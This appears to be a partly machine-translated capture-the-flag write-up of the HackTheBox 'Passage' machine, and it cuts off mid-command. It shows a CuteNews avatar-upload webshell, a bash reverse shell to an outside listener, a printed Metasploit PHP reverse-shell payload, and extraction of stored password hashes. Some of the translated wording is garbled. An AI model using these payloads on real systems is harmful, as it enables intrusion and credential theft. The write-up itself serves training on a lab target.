cms 图片马
ssh泄露
gdbus

# 高温透析管：通道

[0xdf.gitlab.io](https://0xdf.gitlab.io/2021/03/06/htb-passage.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fpassage-cover.) 

在通道中，我会找到并利用带有网络外壳上传的可爱新闻。我必须分析 CuteNews 源，以弄清楚它如何将用户数据存储在文件中，以查找下一个用户的哈希值，我将破解该哈希值。该用户与框中的下一个用户共享 SSH 密钥。为了根，我将利用USBCreator中的一个错误，该错误允许我在不知道用户密码的情况下运行sudo。在“超越根”中，我将深入探讨 base64 的基础知识，以及如何在大量 base64 数据中搜索字符串。

## 箱子信息

名字

[通道](https://www.hackthebox.eu/home/machines/profile/275) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-passage.png) 

发行日期

[05 9月 2020](https://twitter.com/hackthebox_eu/status/1301546185552003073)

停用日期

6 3月 2021

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

中等 \[30\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fpassage-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fpassage-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 00小时 19分钟 35秒。[![断续器](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F103578)](https://www.hackthebox.eu/home/users/profile/103578)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 00小时 32分钟 04秒。[![旅鼠](https://image.cubox.pro/article/2022092211272978721/81764.jpg)](https://www.hackthebox.eu/home/users/profile/11933)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F140851)](https://www.hackthebox.eu/home/users/profile/140851)-

## 侦察

### n地图

`nmap`找到两个打开的 TCP 端口，即固态混合端口 （22） 和 HTTP （80）：

    root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.206
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 15:03 EDT
    Nmap scan report for 10.10.10.206
    Host is up (0.019s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
    Nmap done: 1 IP address (1 host up) scanned in 7.79 seconds
    root@kali# nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.206
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 15:04 EDT
    Nmap scan report for 10.10.10.206
    Host is up (0.015s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
    |   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
    |_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Passage News
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
    

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 16.04 Xenial.

### Website - TCP 80

#### Site

The site is a list of blog posts, but all but the most recent one are just [Lorem Ipsum text](https://loremipsum.io/):

[![image-20200908152147940](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908152147940.png)](https://0xdf.gitlab.io/img/image-20200908152147940.png)

[_Click for full image_](https://0xdf.gitlab.io/img/image-20200908152147940.png)

The top post talks about how they’ve implemented Fail2Ban, which is a good hint to not brute force anything, so I’ll skip here:`gobuster`

> Due to unusually large amounts of traffic, we have implemented Fail2Ban on our website. Let it be known that excessive access to our server will be met with a two minute ban on your IP Address. While we do not wish to lock out our legitimate users, this decision is necessary in order to ensure a safe viewing experience. Please proceed with caution as you browse through our extensive news selection.

There are five users on the site:

*   admin - nadav@passage.htb
*   Paul Coles - paul@passage.htb
*   Kim Swift - kim@example.com
*   Sid Meier - sid@example.com
*   James - james@example.com

I’ll add to .`passage.htb``/etc/hosts`

#### RSS

The RSS link on the right side leads to , which returns the XML RSS feed:`http://10.10.10.206/CuteNews/rss.php`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908153450899.png) 

Removing from the URL leads to the login page:`rss.php`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908154156274.png) 

它还提供了可爱新闻 - 2.1.2的版本。

“注册”按钮处于活动状态，并指向一个用于创建帐户的表单：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908154321702.png) 

我可以创建一个帐户，它会将我带到个人资料页面：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908154516347.png) 

## 壳牌作为万维数据

### 可爱新闻漏洞

运行返回一吨，所以我重新搜索，将其限制为已知版本：`searchsploit cutenews`

    root@kali# searchsploit cutenews 2.1
    ---------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                        |  Path
    ---------------------------------------------------------------------- ---------------------------------
    CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)          | php/remote/46698.rb
    CuteNews 2.1.2 - Arbitrary File Deletion                              | php/webapps/48447.txt
    CuteNews 2.1.2 - Authenticated Arbitrary File Upload                  | php/webapps/48458.txt
    ---------------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
    Papers: No Results
    

我真的不在乎文件删除。看起来第一个和第三个是相似的。

使用 打开 MSF 漏洞，说明如下：`searchsploit -x php/remote/46698.rb`

> 本模块利用 2.1.2 版之前的可爱新闻中的一个命令执行漏洞。攻击者可以通过个人资料区域的头像上传过程渗透到服务器中。在“/core/模块/仪表板.php”中没有对$imgsize功能的实际控制，可以更改文件的标头内容，并且可以绕过控件。我们可以在此过程中使用“GIF”标头。普通用户就足以利用此漏洞。无需管理员用户。该模块将为您创建一个文件并允许 RCE。

滚动浏览代码，有几个函数可以跳出来。:`exec`

      def exec
        res = send_request_cgi({
          'method'   => 'GET',
          'uri'      => normalize_uri(target_uri.path, "uploads","avatar_#{datastore['USERNAME']}_#{@shell}") # shell url
        })
      end
    

和：`upload_shell`

      def upload_shell(cookie, check)
    
        res = send_request_cgi({
          'method'   => 'GET',
          'uri'      => normalize_uri(target_uri.path, "index.php?mod=main&opt=personal"),
          'cookie'   => cookie
        })
    
        signkey = res.body.split('__signature_key" value="')[1].split('"')[0]
        signdsi = res.body.split('__signature_dsi" value="')[1].split('"')[0]
        # data preparation
        fname = Rex::Text.rand_text_alpha_lower(8) + ".php"
        @shell = "#{fname}"
        pdata = Rex::MIME::Message.new
        pdata.add_part('main', nil, nil, 'form-data; name="mod"')
    ...[snip]...
    

的网址是 。看起来它只是上传了一个新的头像，里面有一个扩展名和一个网络外壳。然后通过访问头像 URL 来触发该操作。`upload_shell``/CuteNews/index.php?mod=main&opt=personal``.php``exec`

### 上传网页外壳

访问 ，它提供了一个用于更改个人选项的页面：`index.php?mod=main&opt=personal`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908160214000.png) 

底部有一个头像上传。如果我试图上传PHP代码，就像一个名为的简单网络外壳，网站会立即抛出一个错误，而不会向Passage发送任何请求。这是对文件名的本地 JavaScript 验证。`cmd.php`

如果我只是上传一个实际的图像，它的工作原理：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908160440507.png) 

我将使用以下命令将 Web 外壳作为注释添加到该文件中：`exiftool`

    root@kali:/opt/shells/php# exiftool -Comment='<?php echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; ?>' avatar.png 
        1 image files updated
    

我将上传修改后的文件，仍然带有扩展名，但这次是使用Burp代理拦截。一旦它拦截了请求，我将文件名从 更改为：`.png``avatar.png``avatar.php`

[![image-20200908160843299](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908160843299.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20200908160843299.png)

我将转发该数据包并关闭截获，上传似乎有效。客户端验证是一个不错的用户体验增强功能，但它不是一种安全机制。

头像现在坏了：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908160920455.png) 

如果我右键单击并选择“查看图像”，则完整的网址是：（与元浏览器漏洞的网址匹配）。我可以在末尾访问该URL，服务器将图像作为PHP处理，运行注释：`http://passage.htb/CuteNews/uploads/avatar_0xdf_avatar.php``?cmd=id`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908161034845.png) 

### 壳

现在要得到一个真正的贝壳，我将访问：.外壳程序在侦听器处返回：`http://passage.htb/CuteNews/uploads/avatar_0xdf_avatar.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'``nc`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.206.
    Ncat: Connection from 10.10.10.206:43666.
    bash: cannot set terminal process group (1682): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@passage:/var/www/html/CuteNews/uploads$ 
    

## 谢尔 饰 保罗

### /上载中的枚举

我马上注意到我的目录中还有另外两个上传：

    www-data@passage:/var/www/html/CuteNews/uploads$ ls -l 
    total 20
    -rw-r--r-- 1 www-data www-data 12076 Sep  8 13:11 avatar_0xdf_avatar.php
    -rw-r--r-- 1 www-data www-data  1115 Aug 31 13:48 avatar_egre55_ykxnacpt.php
    -rw-r--r-- 1 www-data www-data  1116 Aug 31 14:55 avatar_hacker_jpyoyskt.php
    

日期是旧的，因此它们必须是框图像的一部分。除此之外，两者都是PHP文件，而不是图像，而且都是反向外壳。例如：`avatar_egre55_ykxnacpt.php`

    /*<?php /**/ error_reporting(0); $ip = '10.10.14.6'; $port = 443; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
    

所以这两个可爱新闻的用户也试图破解这个网站？或者这些可能只是测试工件。我将更多地研究这些用户。

### 存储 - 不是数据库

我想更多地看看数据库，但看看[GitHub的可爱新闻](https://github.com/CuteNews/cutenews-2.0)，在首页的卖点之一是：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908180155278.png) 

为了弄清楚可爱新闻如何存储用户数据，我将从POST请求开始注册：

    POST /CuteNews/index.php?register HTTP/1.1
    Host: 10.10.10.206
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.10.10.206/CuteNews/index.php?register
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 111
    Connection: close
    Cookie: CUTENEWS_SESSION=620744kp29jripj8k27cqj3gt2
    Upgrade-Insecure-Requests: 1
    
    action=register&regusername=0xdf&regnickname=0xdf&regpassword=qwerasdf&confirm=qwerasdf&regemail=0xdf%40aol.com
    

我想我应该能够找到处理的地方，然后看看存储了什么。随着那个POST转到，我从[那里](https://github.com/CuteNews/cutenews-2.0/blob/master/index.php)开始。它超级短：`index.php`

    <?php
    
    /***************************************************************************
     * @Developer CuteNews CutePHP.com
     * @Copyrights Copyright (с)  2012-2013 Cutenews Team
     * @Type Bootstrap
     ***************************************************************************/
    
    define('AREA', "ADMIN");
    include dirname(__FILE__).'/core/init.php';
    
    cn_sendheaders();
    cn_load_skin();
    cn_register_form();
    
    if (cn_login()) {
        hook('index/invoke_module', array($_module) );
    } else {
        cn_login_form();
    }
    

似乎我需要找到.要在GitHub上透视源代码，我将使用页面左上角的搜索框：`cn_registry_form()`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908180423680.png) 

搜索产生了两个结果：`cn_registry_form`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908180816071.png) 

第二个是定义函数的位置。在Ctrl-f和一些滚动之后，我在第[3432行](https://github.com/CuteNews/cutenews-2.0/blob/d5dd74227b888644a72799641ce35b2e711e276f/core/core.php#L3432)找到了这个：

    db_user_add($regusername, $acl_groupid_default);
    db_user_update($regusername, "email=$regemail", "name=$regusername", "nick=$regnickname", "pass=$pass", "acl=$acl_groupid_default");
    

这两个似乎都与“DB”相互作用，但第二个有一堆信息要存储，所以我会这样做。返回带有“db\_user\_update”的搜索栏，该搜索栏似乎在第[229行](https://github.com/CuteNews/cutenews-2.0/blob/d5dd74227b888644a72799641ce35b2e711e276f/core/db/coreflat.php#L229)中定义：`core/db/coreflat.php`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908181026510.png) 

[38 行后](https://github.com/CuteNews/cutenews-2.0/blob/d5dd74227b888644a72799641ce35b2e711e276f/core/db/coreflat.php#L267)：

    // Save DB
    cn_fsave($fn, $cu);
    

我可以猜测该函数正在将数据保存到文件（可能是文件名）。在第[241](https://github.com/CuteNews/cutenews-2.0/blob/d5dd74227b888644a72799641ce35b2e711e276f/core/db/coreflat.php#L241)行，它设置：`$fn``$fn`

    $fn =SERVDIR. path_construct( 'cdata','users',substr(md5($username), 0, 2).'.php');
    

因此，用户数据存储在 中。`/cdata/users/[first two characters of the md5 of the username].php`

### 文件

回到通道，该目录包含相当多的用户：

    www-data@passage:/var/www/html/CuteNews/cdata/users$ ls
    09.php  16.php  32.php  52.php  66.php  77.php  8f.php  b0.php  c9.php  d5.php  fc.php  users.txt
    0a.php  21.php  46.php  5d.php  6e.php  7a.php  97.php  c8.php  d4.php  d6.php  lines
    

我的用户应存储在：`46.php`

    root@kali# echo -n 0xdf | md5sum
    465e929fc1e0853025faad58fc8cb47d  -
    

该文件包含一些 PHP，这些 PHP 将阻止打印后的数据，然后是一行 base64 编码：

    www-data@passage:/var/www/html/CuteNews/cdata/users$ cat 46.php 
    <?php die('Direct call - access denied'); ?>
    YToxOntzOjQ6Im5hbWUiO2E6MTp7czo0OiIweGRmIjthOjk6e3M6MjoiaWQiO3M6MTA6IjE1OTk1OTQ1MTgiO3M6NDoibmFtZSI7czo0OiIweGRmIjtzOjM6ImFjbCI7czoxOiI0IjtzOjU6ImVtYWlsIjtzOjEzOiIweGRmQDB4ZGYuY29tIjtzOjQ6Im5pY2siO3M6NDoiMHhkZiI7czo0OiJwYXNzIjtzOjY0OiJmM2I5ZjU4NTE4ZjJiMjEyNDY3YThhYjUxNzRmMTMyNGQ4Y2JkZmNiYjkwMjhiMTYzNjA1MTA1Zjg1OTc5MTQ2IjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czo2OiJhdmF0YXIiO3M6MjI6ImF2YXRhcl8weGRmX2F2YXRhci5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19
    

当我解码它时，这看起来像序列化的PHP数据：

    root@kali# echo "YToxOntzOjQ6Im5hbWUiO2E6MTp7czo0OiIweGRmIjthOjk6e3M6MjoiaWQiO3M6MTA6IjE1OTk1OTQ1MTgiO3M6NDoibmFtZSI7czo0OiIweGRmIjtzOjM6ImFjbCI7czoxOiI0IjtzOjU6ImVtYWlsIjtzOjEzOiIweGRmQDB4ZGYuY29tIjtzOjQ6Im5pY2siO3M6NDoiMHhkZiI7czo0OiJwYXNzIjtzOjY0OiJmM2I5ZjU4NTE4ZjJiMjEyNDY3YThhYjUxNzRmMTMyNGQ4Y2JkZmNiYjkwMjhiMTYzNjA1MTA1Zjg1OTc5MTQ2IjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czo2OiJhdmF0YXIiO3M6MjI6ImF2YXRhcl8weGRmX2F2YXRhci5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19" | base64 -d
    a:1:{s:4:"name";a:1:{s:4:"0xdf";a:9:{s:2:"id";s:10:"1599594518";s:4:"name";s:4:"0xdf";s:3:"acl";s:1:"4";s:5:"email";s:13:"0xdf@0xdf.com";s:4:"nick";s:4:"0xdf";s:4:"pass";s:64:"f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:22:"avatar_0xdf_avatar.php";s:6:"e-hide";s:0:"";}}}
    

我立即被吸引到该字段，该字段的长度为64个字节：`pass`

    s:4:"pass";s:64:"f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146";
    

这可能是SHA-256哈希值。我可以使用我设置的密码进行测试，并且它符合：

    root@kali# echo -n "0xdf" | sha256sum 
    f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146  -
    

### 查找哈希

#### 从文件中提取

此目录中的文件不多。我将只删除每个文件，删除任何带有空行（）的行，然后一次读取一行，base64解码它们，并添加一个换行符以提高可读性：`cat``php die``grep .`

    www-data@passage:/var/www/html/CuteNews/cdata/users$ for f in *; do cat $f | grep -v 'php die'; echo; done | grep . | while read line; do echo $line | base64 -d; echo; done 
    a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}
    a:1:{s:2:"id";a:1:{i:1598829833;s:6:"egre55";}}
    a:1:{s:5:"email";a:1:{s:15:"egre55@test.com";s:6:"egre55";}}
    a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
    a:1:{s:2:"id";a:1:{i:1598910896;s:6:"hacker";}}
    a:1:{s:4:"name";a:1:{s:4:"0xdf";a:9:{s:2:"id";s:10:"1599594518";s:4:"name";s:4:"0xdf";s:3:"acl";s:1:"4";s:5:"email";s:13:"0xdf@0xdf.com";s:4:"nick";s:4:"0xdf";s:4:"pass";s:64:"f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:22:"avatar_0xdf_avatar.php";s:6:"e-hide";s:0:"";}}}
    ...[snip]...
    

我可以做得更好，然后只获取带有密码的行（因为有一堆不包含密码的条目）：`grep``pass`

    www-data@passage:/var/www/html/CuteNews/cdata/users$ for f in *; do cat $f | grep -v 'php die'; echo; done | grep . | while read line; do echo $line | base64 -d; echo; done | grep '"pass"'            
    a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
    a:1:{s:4:"name";a:1:{s:4:"0xdf";a:9:{s:2:"id";s:10:"1599594518";s:4:"name";s:4:"0xdf";s:3:"acl";s:1:"4";s:5:"email";s:13:"0xdf@0xdf.com";s:4:"nick";s:4:"0xdf";s:4:"pass";s:64:"f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:22:"avatar_0xdf_avatar.php";s:6:"e-hide";s:0:"";}}}
    a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
    a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
    a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}
    a:1:{s:4:"name";a:2:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598906881";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_ykxnacpt.php";s:6:"e-hide";s:0:"";}s:6:"hacker";a:11:{s:2:"id";s:10:"1598910896";s:4:"name";s:6:"hacker";s:3:"acl";s:1:"4";s:5:"email";s:20:"hacker@hacker.hacker";s:4:"nick";s:6:"hacker";s:4:"pass";s:64:"e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9";s:3:"lts";s:10:"1599600451";s:3:"ban";s:1:"0";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:26:"avatar_hacker_jpyoyskt.php";s:6:"e-hide";s:0:"";}}}
    a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
    a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
    a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
    a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}
    a:1:{s:4:"name";a:1:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598834079";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_spwvgujw.php";s:6:"e-hide";s:0:"";}}}
    

这些是PHP序列化的对象，所以我可以用PHP读它，但是一些手动清理或也会这样做（我将在下一节中显示一行）：`vim``grep`

    nadav:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e
    0xdf:f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146
    sid-meier:4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
    paul-coles:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
    kim-swift:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
    egre55:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
    hacker:e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
    

这让我想起了在base64编码的数据中搜索内容，虽然这里根本不需要，但我将在Beyond Root中使用它。

#### 捷径

在文件夹中还有一个名为 的文件，它似乎是所有其他文件组合在一起的。我可以从中拉出哈希值：`users``lines`

  
```
  www-data@passage:/var/www/html/CuteNews/cdata/users$ cat lines | grep -v "php die" | while read line; do echo $line | base64 -d; done
